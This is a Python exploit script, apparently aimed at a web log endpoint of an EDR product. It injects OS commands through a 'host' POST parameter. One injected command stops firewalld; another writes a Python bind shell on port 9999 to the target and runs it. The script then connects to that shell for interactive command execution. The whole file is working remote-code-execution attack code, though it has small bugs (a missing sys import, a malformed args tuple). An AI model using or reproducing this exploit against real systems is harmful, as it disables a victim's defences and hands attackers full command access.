# -*- coding: utf-8 -*-
# @Time    : 2020/8/18 8:22 下午
# @Author  : Ruirui
# @File    : edrshell.py

import socket, os
import threading
import requests
import urllib3
urllib3.disable_warnings()

def pyshell(baship):
    code = r'''
import socket,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('', 9999))
s.listen(5)
rcve_data,_=s.accept()
while True:
    data=rcve_data.recv(1024)
    rcve_data.sendall(str(os.popen(data.decode(encoding='GBK').replace('\r\n','')).read()).encode())
    '''
    try:
        requests.post('{}/tool/log/c.php?strip_slashes=system'.format(baship), data={"host": 'systemctl stop firewalld.service'}, verify=False)
        requests.post('{}/tool/log/c.php?strip_slashes=system'.format(baship),  data={"host": 'echo "{}" > c.py && python c.py &'.format(code)}, verify=False)
    except Exception as e:
        print(e)

def client(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        while True:
            i = input('$>')
            s.sendall(i.encode())
            data = s.recv(999999)
            print(data.decode('GBK').replace('\n', ''))
    except Exception as e :
        print(e)

if __name__=='__main__':
    t1 = threading.Thread(target=pyshell, args=('https://{}'.format(sys.argv[1]))
    t2 = threading.Thread(target=client, args=('{}'.format(sys.argv[1]), int(sys.argv[2])))
    t1.start()
    t2.start()

      